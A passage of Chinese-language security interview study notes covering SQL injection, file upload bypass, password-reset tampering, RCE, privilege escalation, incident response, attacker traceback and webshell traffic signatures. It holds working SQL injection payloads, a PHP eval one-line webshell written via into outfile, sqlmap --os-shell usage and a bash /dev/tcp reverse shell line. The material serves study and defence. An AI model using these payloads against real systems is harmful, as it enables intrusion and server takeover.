> ​	g.未循环验证，可以使用x.php..类似的方法 
>
> 
>
> 2.绕过白名单验证（一般需要配合其他漏洞一起利用） 
>
> ​	a.%00截断 **【操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。】**
>
> ​	b.图片马 
>
> ​	c.条件竞争 （条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。这个术语最初来自于两个电信号互相竞争来影响输出结果。）





## 13.4、任意密码修改

> ## 绕过攻击是指在未知他人的重置密码链接或手机验证码的情况下，通过构造重置密码链接或穷举手机验证码的方式直接重置他人的密码。
>
> 打开burp
>
> 输入任意手机号码，验证码随便填，
>
> <img src="v2-bd9002146ab0a4931362680f211f8541_720w.jpg" alt="img" style="zoom:67%;" />
>
> 开启抓包，点击注册。
>
> <img src="v2-12c54a3377f8f51404cdec1b12052595_720w.jpg" alt="img" style="zoom:67%;" />
>
> 注意，这里要多一个步骤，
>
> <img src="v2-98d94d82d155b9cefbb89d7b3791f662_720w.jpg" alt="img" style="zoom:67%;" />
>
> 右键，单机do ·· 这个的作用是可以抓到返回包并可修改返回值，
>
> 大家可以看到这个显示的是-1，
>
> <img src="v2-29b5e47c29e817e01f15f6ce78486f05_720w.jpg" alt="img" style="zoom:67%;" />
>
> 把它改成1看看，注册成功！
>
> ## 防御
>
> 1. 添加验证码，并把验证码设置为 6 位数 。
> 2. 对验证码校验做限制，如输错 5 次则要求输入图片验证码或者使用短信验证码。
> 3. 缩短验证码有效时间，不要让验证码长时间有效。
> 4. 限制每个验证码验证错误次数。



## 13.5、sql注入

> ### -u 单个URL -m xx.txt 多个URL 
>
> -d "mysql://user:password@10.10.10.137:3306/dvwa" 作为服务器客户端，直接连接数据库 
>
> --data post/get都适用 
>
> -p 指定扫描的参数 
>
> -r 读取文件 
>
> -f 指纹信息 
>
> --tamper 混淆脚本，用于应用层过滤 
>
> --cookie --user-agent --host等等http头的修改 
>
> --threads 并发线程 默认为1 
>
> --dbms MySQL<5.0> 指定数据库或版本 
>
> –level=LEVEL 执行测试的等级（1-5，默认为 1） 
>
> –risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险 
>
> –current-db / 获取当前数据库名称 
>
> –dbs 枚举数据库管理系统数据库**4.**菜刀、蚁剑、冰蝎流量特征 
>
> –tables 枚举 DBMS 数据库中的表 
>
> –columns 枚举 DBMS 数据库表列 
>
> -D DB 要进行枚举的数据库名 
>
> -T TBL 要进行枚举的数据库表 
>
> -C COL 要进行枚举的数据库列 
>
> -U USER 用来进行枚举的数据库用户 
>
> ### 常用的tamper： 
>
> base64encode.py #转为b64编码 
>
> charencode.py url编码 
>
> chardoubleencode.py 双URL编码 
>
> unmagicquotes.py 宽字节 
>
> randomcomments.py 用/**/分割SQL关键字 
>
> space2plus.py space2comment.py space2xxxx.py 替换空格为xx 
>
> ### Post注入： 
>
> sqlmap -r "数据包地址" -p "参数" -dbms 数据类型 
>
> ### Get注入 
>
> sqlmap -u "注入点地址" --dbms 参数 
>
> sqlmap进行交互式写shell 
>
> 1-前提条件：最高权限、知道web网站绝对路径、能获取到cookie 
>
> 2-sqlmap.py -u "注入点地址" --cookie="cookie值" --os-shell -echo “一句话木马”>网站的绝对路径 
>
> 3-输入web网站的绝对路径 
>
> 4-传木马





# 面试面试面试面试面试：

## wireshark筛选传参方式怎么写：

> ***\*wireshark简单的过滤规则\****
>
> ***\*过滤ip:\****
>
> 过滤源ip地址:ip.src==1.1.1.1;,目的ip地址:ip.dst==1.1.1.1;
>
> ***\*过滤端口\****:
>
> 过滤80端口:tcp.port==80,源端口:tcp.srcport==80,目的端口:tcp.dstport==80
>
> ***\*协议过滤\****:
>
> 直接输入协议名即可,如http协议http
>
> ***\*http模式过滤\****:
>
> 过滤get/post包http.request.mothod=="GET/POST"



## 时间注入和布尔盲注区别：

> ### 布尔盲注:
>
> 指的是在不知道数据库返回值的情况下对数据中的内容进行猜测。
>
> ### 
>
> 页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据、
>
> ### 1、
>
> http://127.0.0.1/Less-8/?id=1’and (length(database()))>10 –+
>
> 当前数据库database（）的长度大于10，返回true页面，否则FALSE页面
>
> ### 2、
>
> get一个参数 id =1,返回TRUE页面
>
> 注入测试加单引号id=1′,返回不正确页面。
>
> ### 时间盲注：
>
> 通过页面沉睡时间判断
>
> ### 1、
>
> **http://127.0.0.1/Less-9/?id=1' and (if(ascii(substr(database(),1,1))>100,sleep(10),sleep(4))  --+** 
>
> 如果当前查询的当前数据库ascii(substr(database()),1,1)的第一个字符的ASCII码大于100，ture 沉睡10秒，FALSE 沉睡4秒



## Sql堆叠注入：

从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。





## 端口：

> 21		ftp				匿名访问，弱口令
>
> 22       SSH                 弱口令登录
>
> 23       Telnet                弱口令登录
>
> 80        Web             常见Web漏洞或后台登录弱口令
>
> 161       SNMP             public弱口令
>
> 389       LDAP             匿名访问
>
> 443       openssl            心脏滴血等
>
> 445        smb              操作系统溢出漏洞
>
> 873       rsync             匿名访问，弱口令
>
> 1099      JAVArmi           命令执行
>
> 1433      MsSQL            弱口令
>
> 1521      Oracle             弱口令
>
> 2601      Zebra             默认密码zebra
>
> 3128     squid         匿名访问（可能内网漫游）
>
> 3306     MySQL        弱口令
>
> 3389      RDP        远程桌面弱口令
>
> 4440       Rundeck              弱口令admin
>
> 4848      GlassFish            弱口令admin/adminadmin
>
> 5432       PostGreSQL            弱口令爆破
>
> 6379       Redis                匿名访问
>
> 7001,7002    Weblogic              弱口令爆破
>
> 8080      Tomcat\Jboss            弱口令，Jboss匿名访问
>
> 8080-8090                     常见Web端口
>
> 9043       WebSphere             弱口令爆破
>
> 27017      MongoDB              未授权访问



## 熟悉哪些漏洞：

> xss
>
> csrf
>
> 注入式漏洞
>
> 逻辑漏洞
>
> 弱口令



# 14  、面试题



## 1、护网遇见比较多的报警有那些

弱口令、命令执行、反序列化、任意文件读取、SQL 注入等



## 2、了解安全设备

**IDS ：**入侵检测系统IDS检测到攻击，则IDS可以向防火墙发送命令以阻止特定的数据包

**IPS：**入侵防御系统IPS是对防病毒软件和防火墙的补充，入侵防御系统能够监视网络**传输行为**，能够即时的中断、隔离一些不正常的网络资料传输行为。

**Waf：**

> 专注于保护网站（或通常的Web应用程序）。 它在应用程序层工作以检查HTTP Web**流量**，以检测针对网站的恶意攻击。
>
> WAF防范常规的 web 应用攻击，将检测SQL注入攻击，跨站点脚本，Javascript攻击，RFI / LFI攻击等。
>
> 由于当今大多数网站都使用SSL（HTTP），因此WAF还可以通过终止SSL会话并在WAF本身上检查连接内部的流量来提供SSL加速和SSL检查。



**蜜罐**： 用于欺骗攻击者并跟踪攻击者，通过布置一些作为诱饵的主机或网络服务，诱使攻击方对他们实施 攻击，从而可以对攻击行为进行捕获和分析 

 

**奇安信的天眼**

> ##### *[\*高级威胁检测\****
>
> 运用威胁情报、文件虚拟执行、智能规则引擎、机器学习等技术，天眼系统可以检测和发现高级网络攻击和新型网络攻击，涵盖：APT攻击、勒索软件、WEB攻击、远控木马、僵尸网络、窃密木马、间谍软件、网络蠕虫、邮件钓鱼等高级攻击，并基于**可视化技术**，清晰的展示网络中的威胁。
>
> ##### ***\*异常行为检测\****
>
> 基于网络流量数据，天眼系统运用大数据分析和机器学习技术建立网络异常行为检测模型，内置非常规服务分析、登录行为分析、邮件行为分析、数据行为分析等数种场景，实现对新型攻击和内部违规的检测和发现。
>
> ##### ***\*告警响应处置\****
>
> 天眼系统为企业用户提供攻击告警的列表、统计、查询、调查等功能，帮助安全运营人员快速研判和处置告警事件。
>
> ##### ***\*攻击回溯分析\****
>
> 天眼系统支持全包取证分析，并提供线索可视化图谱拓线分析能力（威胁狩猎）能为企业用户呈现一次攻击的完成过程，帮助用户对网络攻击进行回溯和深度分析。]



**深信服的态势感知**：[综合分析网络安全要素、评估网络安全状况、预测其发展趋势，并以可视化的方式展现给用户，并给出相应的报表和应对措施。]





## 3、如果判断是否成功，怎么判断误判

（1）比如说：攻击方尝试利用现成的「EXP&POC集成脚本工具」

> POC：全称 ' Proof of Concept '，中文 ' 概念验证 ' ，常指一段漏洞证明的代码。
>
> EXP：全称 ' Exploit '，中文 ' 利用 '，指利用系统漏洞进行攻击的动作。
>
> POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。

对资产目标进行检测扫描，安全设备检测到「攻击尝试行为」中的攻击特征就会产生告警。这种情况下，可以把告警中的URL的**“网页状态码”**、“**页面回显数据”**作为「误报告警」判断

**真实攻击不可能只持续一次，它一定是长时间、周期性、多 IP 的进行攻击**

 

（2）判断攻击

使用**态势感知安全设备**检测到来自外部或内部的「攻击尝试行为」就会触发告警，

需要**对告警日志进行研判分析**，从其中找出「真实有效」的攻击事件。



## 4、被攻击后应急响应

**基本思路流程#**

\1. 收集信息：收集客户信息和中毒主机信息，包括样本

> **从数据包中看到带有攻击特征码的数据包，有 返回结果的回包可以判断是否成功，如果确认成功，就说明该参数有漏洞，**
>
> **首先需 要通过监控设备、中间件日志、系统日志定位该 IP 地址，要知道攻击是怎样进来 的**

\2. 判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等

> 去服务器排查攻击达到了哪个层面，有 web 层面，系统层面，数据库层面， 应用软件层面

\3. 抑制范围：隔离使受害⾯不继续扩⼤

>  用一些 360 星图工具排查日志， D 盾、安全狗扫一下 web 代码里有没有脚本后门

\4. 深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源

\5. 清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产

\6. 产出报告：整理并输出完整的安全事件报告



## 5、怎么溯源



> **1.收集攻击源**
>
> · 安全设备报警的是何种类型的攻击，比如ip扫描，勒索病毒，dos之类的
>
> · 日志与流量分析，找出异常的通讯流量、并查看他的攻击源与攻击目标等
>
> · 服务器资源异常，找出异常的文件、账号、进程、端口，之类的
>
> · 邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等
>
> · 蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹【Cookie、Session、Evercookie、Flash Cookies】、行为、意图的相关信息

**2.溯源反制手段**[**#**](#1062449385)

· IP 定位技术
根据IP定位物理地址–代理 IP
溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息

· ID 追踪术
ID 追踪术，搜索引擎、社交平台、技术论坛、社工库匹配
溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息

· 网站 url
域名 Whois 查询–注册人姓名、地址、电话和邮箱 --域名隐私保护
溯源案例：通过攻击 IP 历史解析记录/域名，对域名注册信息进行溯源分析

· 恶意样本分析
提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析
溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者

· 社交账号
基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等
利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销

> **3.攻击者画像**[**#**](#2639510066)
>
> · 攻击路径
>
> 攻击目的：拿到权限、窃取数据、获取利益、DDOS 等
> 网络代理：代理 IP、跳板机、C2 服务器等
> 攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等
>
> · 攻击者身份画像
>
> 虚拟身份：ID、昵称、网名
> 真实身份：姓名、物理位置
> 联系方式：手机号、qq/微信、邮箱
> 组织情况：单位名称、职位信息





## 6、怎么研判

研判工作要充分利用已有安全设备（需要提前了解客户的网络拓扑以及部署设备情况），                

 分析其近期的设备告警，将全部流量日志（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）                    

根据研判标准进行筛选（像挖矿、蠕虫、病毒、拒绝服务这类不太可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量），                                                     一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多 IP 的进行攻击



对于告警结合威胁情报库如：微步、奇安信威胁情报中心、绿盟威胁情报云等

对于流量日志的原 IP 地址进行分析，判断其是否为恶意攻击，如果确认为攻击行为或者不能确认是否为攻击行为，进行下一步操作，在之前准备好的表格中查找 IP 是否为客户内网部署的设备，如果不是，继续进行下一步，在事件上报平台查看是否有其他人提交过，如果没有，则上报



## 7、上报

最后上报事件时，尽可能提供完整的截图，包括源 ip、目的ip，请求包请求体，响应包响应体等重要信息，以方便后续人员研判溯源





## 8、有没有通过流量分析工具，怎么用，命令有啥。

Wireshark抓包工具：

主要抓取报文，然后对报文进行过滤

![img](wps4.jpg) 



***\*wireshark简单的过滤规则\****

***\*过滤ip:\****

过滤源ip地址:ip.src==1.1.1.1;,目的ip地址:ip.dst==1.1.1.1;

***\*过滤端口\****:

过滤80端口:tcp.port==80,源端口:tcp.srcport==80,目的端口:tcp.dstport==80

***\*协议过滤\****:

直接输入协议名即可,如http协议http

***\*http模式过滤\****:

过滤get/post包http.request.mothod=="GET/POST"





## 9、数据包或者日志，你的分析思路是什么

用流量监测的安全设备，比如天眼，查看报文，分析报文里的 host 和网站目录路径，查看是否可疑，

使用微步查询 host 是否为恶意，

使用 wireshark 对数据包深度分析

看一下请求的网站路径，源 IP 与目的 IP 地址，host 字段的值以及发包内容等

工具有 wireshark，网站的话微步在线等威胁情报中心



## 10、sql注入数据包里面怎么判断是否是真实

and1=1  or1=1

首先在传入数据包的参数中有非常明显的sql语句特征

以及页面的回显数据中有明显的数据库的库以及表的特征



## 11、webshell上传成功了怎么查看

通常将js、asp或者php后门文件与web目录下正常的网页文件混在一起，然后可以使用浏览器或者冰蝎等常见工具进行访问，从而控制网站服务器的目的。

如发现后台目录有文件上传，**用御剑进行扫描**：找到有用的目录，**可以看到上传页面**，然后**再进行bp抓包扫出来的这个目录，然后再进行流量数据包或者是日志分析**



## 12、冰蝎流量特征

- http 包头中，content-type 为 application/octet-stream 【这个MIME类型主要是用来下载使用。或者未知类型】强行特征码

- 冰蝎 3.0 内置的默认 16 个 userAgent，可以作为 waf 规则特征。



## 13、冰蝎连接之后看哪个字段判断成功？

- 上传木马之后，第一次会进行密钥交换的过程，那么我们可以抓到这个密钥，拿出来在burp中对数据包进行解密，一次解密过后可能就会看到**eval或assert等字符特征**，那基本上可以确定是冰蝎已经连接成功了，再继续base64解密，可以看到这个eval中包含的木马语句。

- 中国菜刀的攻击流量特征就很明显，直接base64加密，容易被各类安全设备检测，实际场景中越来越少使用。



## 14、渗透测试流程：

- ## 项目前期准备工作

- ## 信息收集：

  - ### whois（万网、站长之家）：用来查询[域名](https://baike.baidu.com/item/域名/86062)的IP以及[所有者](https://baike.baidu.com/item/所有者/2193463)等信息，查询[域名](https://baike.baidu.com/item/域名/86062)是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、[域名注册](https://baike.baidu.com/item/域名注册)商）

  - ### 网站源ip

    - ##### 判断ip是否为真实ip：

      - *Nslookup：*Win下使用nslookup命令进行查询，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。
      - *多地ping查询*：使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。

    - ##### 如何绕过CDN查询真实ip：

      - *DNS历史解析记录*：可能会找到网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：

        ```
        iphistory：https://viewdns.info/iphistory/
        DNS查询：（https://dnsdb.io/zh-cn/）
        微步在线：（https://x.threatbook.cn/）
        域名查询：（https://site.ip138.com/）
        DNS历史查询：（https://securitytrails.com/）
        Netcraft：https://sitereport.netcraft.com/?url=github.com
        ```

      - *查找子域名：*搜索引擎查询

      - *网站邮件头信息：*通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP

      - *国外主机解析域名*：大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有

      - *扫描全网*

  - ### 旁站：目标网站无法拿下时，找和目标网站同服务器下的某一个网站，从那里突破拿到旁站的webshell然后再突破权限拿到目标站

  - ### 服务器系统版本：

    - ##### wireshark抓包

    - ##### wget -S URL（\# wget -S www.xunlei.com）

    - ##### curl -I URL（# curl -I www.xunlei.com）

  - ### 数据库类型：SQL注入错误反馈信息判别是mysql还是其他的（报错有mysql的关键字的是mysql）

  - ### 二级域名：．com．cn”域名结构中，“.com”此时是置于国家顶级域名“.cn”下的二级域名

  - ### 防火墙（检查是否有墙，黑白名单绕过）

  - ### 维护者信息（whois查询）

  - ### 容器版本：cat命令查看

- ## 漏洞扫描：

  - ### Nessus：负责解决补丁，软件问题，恶意软件和[广告软件删除工具](https://gbhackers.com/best-adware-removal-tool/)以及各种操作系统和应用程序上的错误配置

  - ### AWVS：AWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。

- ## 手动挖掘：逻辑漏洞

- ##  验证漏洞

- ## 修复建议 

- ## 输出报告



## 15、sql注入

#### （1）如何判断sql注入，有哪些方法

> 提交错误语句是否有异常，除此之外这些显示的错误可以通过sleep,修眠语句执行5秒等，除此之外通过DNSlog判断是还有传回值

#### （2）如何判断 SQL 注入漏洞成因，如何防范？注入方式有哪些？除了数据库数据，利用方式还有哪些？

> 把用户输入的数据当作代码执行，根本原因在于代码中没有对用户输入项进行验证和处理便直接拼接 到查询语句中。
>
>  
>
> 注入类型有6种，可以参考SQLMAP，        
>
>  1）报错注入
> 2）bool型注入
> 3）延时注入
> 4）宽字节注入
>
> 
>
> 注入提交方式：GET、POST、Cookies、文件头

#### （3）报错注入函数

> ### updatexml（）
>
> ### extractvalue（）
>
> ### 当这两个函数在执行时，如果出现xml文档路径错误就会产生报错
>
> 
>
> #### updatexml():是mysql对xml文档数据进行查询和修改的xpath函数
>
> > ***\*select \* from test where ide = 1 and (updatexml(1,0x7e,3));\**** ***\*由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。\****
> >
> > **爆出数据库及相关信息****
> >
> > ```sql
> > 1' 
> > and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)
> > ```
> >
> > **爆当前数据库表信息**
> >
> > ```sql
> > 1' 
> > and updatexml(1,concat(0x7e,(select group_concat(table_name) 
> > from information_schema.tables 
> > where table_schema=database()),0x7e),1)
> > ```
>
> #### extractvalue()：是mysql对xml文档数据进行查询的xpath函数
>
> > ***\*select user,password from users where user_id=1 and (extractvalue(1,0x7e));\****
> >
> > ***\*由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。\****
> >
> > **爆出数据库及相关信息**
> >
> > ```sql
> > 1' 
> > and extractvalue(1,concat(0x7e,user(),0x7e,database())) 
> > ```
> >
> >  
> >
> > **爆当前数据库表信息**
> >
> > ```sql
> > 1' 
> > and extractvalue(1,concat(0x7e,(select group_concat(table_name) 
> > from information_schema.tables 
> > where table_schema=database())))
> > ```
> >
> > **爆用户名**
> >
> > ```sql
> > 1' 
> > and extractvalue(1,concat(0x7e,(select group_concat(column_name) 
> > from information_schema.columns 
> > where table_schema=database() 
> > and table_name='users'))) 
> > ```

> #### floor():mysql中用来取整的函数
>
> > ```sql
> > id=1' union select count(*),floor(rand(0)*2) x from information_schema.schemata group by x
> > ```
> >
> > **爆当前数据库名**
> >
> > ```sql
> > id=1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x
> > ```
>
> #### exp():此函数返回e(自然对数的底)指数X的幂值
>
> > 当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误：
> >
> > · 得到表名：
> >
> > ![image-20220617212709601](image-20220617212709601.png)
> >
> > · 得到列名：
> >
> > ![image-20220617212721188](image-20220617212721188.png)



#### (4)延时报错

```sql
if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)
```



#### （5）sql注入写文件函数

```sql
select '一句话' into outfile '路径' 

select '一句话' into dumpfile '路径'

select '<?php eval($_POST[1]) ?>' into dumpfile '
```



#### （6）盲注和延时注入的共同点？

都是一个字符一个字符的判断







## 16、问了rce（命令执行）没有回显怎么办

> RCE漏洞，可以让攻击者直接向后台[服务器](https://cloud.tencent.com/product/cvm?from=10680)远程注入**操作系统命令**或者**代码**，从而控制后台系统。
>
> 一般出现这种漏洞，是因为**应用系统从设计上需要给用户提供指定的远程命令操作的接口**。比如我们常见的路由器、防火墙、[入侵检测](https://cloud.tencent.com/product/cwp?from=10680)等设备的**web管理界面**上。一般会**给用户提供一个ping操作的web界面**，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果



> #### 反弹shell，在无回显的RCE中，我们输入的命令是执行了的，只是不给我们显示出来，我们可以输入用来反弹shell的命令来拿到对方服务器的权限。输入bash -i >& /dev/tcp/ip/port 0>&1 这个命令，通过自己服务器来对对方服务器进行查询，这时候就不会有过滤限制和无回显的限制了。



## 17、怎么判断是扫描器的流量还是手工扫描的流量

扫描的速度可以参考，是不是脚本扫的，就是流量的速度，一般像sqlmap这种，日志会有这个字段显示的，ua头，扫描量与扫描日志分析



## 18、xxe漏洞

### （1）



### （2）xxe的引入方式







## 19、sql提权的方式

mysql提权，serv-u提权，

1、 通过 UDF 提权；

UDF可以理解为MySQL的函数库，可以利用udf定义的创建函数。想要利用udf，必须上传udf.dll作为udf的执行库。MySQL中支持UDF扩展，使得我们可以调用DLL里面的函数来实现一些特殊的功能。

> 利用了root高权限，创建带有调用 cmd 的函数的 udf.dll 动态链接库， 
>
> 导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd 
>
> 限制条件： 
>
> 1-MySQL 数据库没有开启安全模式（确认secure_file_priv=''是否为空） 
>
> 2-已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。 
>
> 3-shell有写入到数据库安装目录的权限。 
>
> ![image-20220618000553828](image-20220618000553828.png)
>
> ![image-20220618000602843](image-20220618000602843.png)

 

2、 通过 mof 提权；

利用了C:\Windows\System32\wbem\MOF目录下的nullevt.mof文件

利用该文件每分钟会去执行一次的特性，向该文件中写入cmd命令，就会被执行

>  MOF提权是一个有历史的漏洞，基本上在Windows Server 2003的环境下才可以成功。提权 
>
> 的原理是C:/Windows/system32/wbem/mof/目录下的mof文件每隔一段时间（几秒钟左 
>
> 右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS脚本，所以可以利用这个VBS脚本 
>
> 来调用CMD来执行系统命令，如果 MySQL有权限操作 mof 目录的话，就可以来执行任意命令 
>
> 了



3、开机启动脚本（启动项提权）

利用MySQL，将后门写入开机启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器，才可以运行。



## 20、sql写一句话木马

一句话木马与sql注入漏洞结合使用，利用回显注入，将一句话木马写入网页的根目录。

sql函数写入shell ，就是基本的into outfile的利用



## 21、谈谈IDS和IPS

IDS：入侵检测系统，依照一定的安全策略，对网络、系统、运行状况进行监视，竟可能发现各种攻击企图、攻击行为或者供给结构，以保证网络系统资源的机密性、完整性和可用性。

IPS：入侵防御系统，深度感知并检测流经的数据流量，对恶意报文进行丢弃以阻断攻击，对滥用报文进行限流以保护网络带宽资源。

 

IDS与IPS区别：

IPS位于防火墙和网络的设备之间的设备，当检测到攻击，IPS会在这种攻击扩散到网络的其他地方之前阻止这个恶意；

IDS只存在于网络之外，起到报警的作用，没有防御作用。



## 22、Java 反序列化的原理

Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。

（1）什么是序列化与反序列化？ 

基本概念 

• 把Java对象转换为字节序列的过程称为对象的序列化(Serialization) 

• 把字节序列恢复为Java对象的过程称为对象的反序列化(DeSerialization) 

JDK 类库中的序列化API 

Java.io.ObjectOutputStream 代表对象输出流，它的writeObject(Object obj) 方 

法可对参数指定的obj 对象进行序列化，把得到的字节序列写到一个目标输出流中。 

Java.io.ObjectInputStream 代表对象输入流，它的readObject() 方法从一个源输 

入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 

只有实现了Serializable 和Externalizable 接口的类的对象才能被序列化。 

 

（2）对象序列化步骤：

1、创建一个对象输出流，它可以包装 一个其他类型的目标输出流，如文件 输出流； 

2、通过对象输出流的writeObject() 方法写对象。 

• 对象反序列化步骤： 

1、创建一个对象输入流，它可以包装 一个其他类型的源输入流，如文件输 入流； 

2、通过对象输入流的readObject() 

方法读取对象。

![img](wps5.jpg) 

 

（3）PHP反序列化常用函数： 

serialize() 把变量和它们的值编码成文本形式 

unserialize() 恢复原先变量 

序列化：将状态信息【对象，类，变量，函数名等】保存为字符串。 

反序列化，将字符串保存为状态信息。 

Java反序列化： 

Serializable 

jdk序列化、fastjson序列化、protobuf序列化 

序列化： ObjectOutputStream 类 --> writeObject() 

反序列化: ObjectInputStream 类 --> readObject() 

注：该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。





## 23、Windows和Linux的目录

Linux日志文件：/var/log

> cat messages可以查看某个日志文件

Linux用户目录：/usr

Windows日志文件：应用程序日志、安全日志、系统日志、DNS日志默认位置：%systemroot%\system32\config



## 24、如何查看系统内存shell

使用命令：[内存](https://so.csdn.net/so/search?q=内存&spm=1001.2101.3001.7020)查看：#cat /proc/meminfo | grep MemTotal



## 25、基础漏洞端口号

> 21		ftp				匿名访问，弱口令
>
> 22       SSH                 弱口令登录
>
> 23       Telnet                弱口令登录
>
> 80        Web             常见Web漏洞或后台登录弱口令
>
> 161       SNMP             public弱口令
>
> 389       LDAP             匿名访问
>
> 443       openssl            心脏滴血等
>
> 445        smb              操作系统溢出漏洞
>
> 873       rsync             匿名访问，弱口令
>
> 1099      JAVArmi           命令执行
>
> 1433      MsSQL            弱口令
>
> 1521      Oracle             弱口令
>
> 2601      Zebra             默认密码zebra
>
> 3128     squid         匿名访问（可能内网漫游）
>
> 3306     MySQL        弱口令
>
> 3389      RDP        远程桌面弱口令
>
> 4440       Rundeck              弱口令admin
>
> 4848      GlassFish            弱口令admin/adminadmin
>
> 5432       PostGreSQL            弱口令爆破
>
> 6379       Redis                匿名访问
>
> 7001,7002    Weblogic              弱口令爆破
>
> 8080      Tomcat\Jboss            弱口令，Jboss匿名访问
>
> 8080-8090                     常见Web端口
>
> 9043       WebSphere             弱口令爆破
>
> 27017      MongoDB              未授权访问



## 26、数据库、web、web服务器漏洞

MySQL数据库、MSSQL数据库、Oracle数据库、PostgreSQL数据库、Redis数据库等等



WEB中间件: Tomcat、Jboss、WebLogic



IIS(Windows 的 WWW 服务器)、Apache、Nginx、lighttpd





## 27、如何拿webshell？怎么提权？

（1）ROOT提权如果你获得了MSSQL的密码，那么就可以导入注册表的方式，利用MSSQL语句执行我们想要的命令了

（2）FTP溢出提权(这个用到LCX工具，本地溢出，转发一个端口，虽然不是内网，利用默认的21进行提升权限）

（3）IIS提权（IIS6.0提权，首先需要获取IIS的配置信息，利用工具进行添加后门用户）



因为大多数的应用用户是没有登录权限的，我们可以使用 Suid 提权，查找一 个带有 S 权限的文件一般为二进制文件，然后根据找到的文件，使用 nmap,find 等命令打开一个 shell,在这个 shell 里面就可以执行一些 root 命令 了。 或者可以查看/etc/passwd 的文件看看此主机有什么可以登录的用户，然后针 对密码进行一个爆破



## 28、getshell 的几种方式

比如：文件上传，RCE，反序列化



## 29、反弹 shell 的写入方式

比如可以利用 redis 数据库的未授权访问 可以直接写入反弹 shell 拿到系统 权限 或者我们可以写入一个 ssh 公钥，直接登录了





## 30、windows查看



### 30.1、查看服务器是否存在可疑账号、新增账号

检查方法：打开 cmd 窗口，输入 lusrmgr.msc 命令，查看是否有新增/可疑的账号， 

如有管理员群组的（

Administrators）里的新增账户，如有，请立即禁用或删除掉



### 30.2、查看服务器是否存在隐藏账号、克隆账号

检查方法： 

a、win+R 输入“regedit” 打开注册表，查看管理员对应键值。 

b、使用 D 盾_web 查杀工具，集成了对克隆账号检测的功能。



### 30.3、结合日志，查看管理员登录时间、用户名是否存在异常

检查方法： 

Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。





### 30.4、检查异常端口、进程

（1）检查端口连接情况，是否有远程连接、可疑连接。 

检查方法： 

a、netstat -ano 查看目前的网络连接，定位可疑的 ESTABLISHED 

b、根据 netstat 定位出的 pid，再通过 tasklist 命令进行进程定位 tasklist| 

findstr “PID” 

 

（2）进程

检查方法： 

a、开始--运行--输入 msinfo32，依次点击“软件环境→正在运行任务”就可以查看 

到进程的详细信息，比如进程路径、进程 ID、文件创建日期、启动时间等。 

b、打开 D 盾_web 查杀工具，进程查看，关注没有签名信息的进程。 

c、通过微软官方提供的 Process Explorer 等工具进行排查。 

d、查看可疑的进程及其子进程。可以通过观察以下内容： 

没有签名验证信息的进程 

没有描述信息的进程 

进程的属主进程的路径是否合法 

CPU 或内存资源占用长时间过高的进程 

小技巧：

a、查看端口对应的 PID：netstat -ano | findstr “port” 

b、查看进程对应的 PID：任务管理器--查看--选择列--PID 或者 tasklist| 

findstr “PID” 

c、查看进程对应的程序位置： 

任务管理器--选择对应进程--右键打开文件位置 

运行输入 wmic，cmd 界面输入 process 

d、tasklist /svc 进程--PID--服务 

e、查看 Windows 服务所对应的端口： 

%system%/system32/drivers/etc/services 

（一般%system%就是 C:\Windows） 



### 30.5、检查服务器是否有异常的启动项

检查方法： 

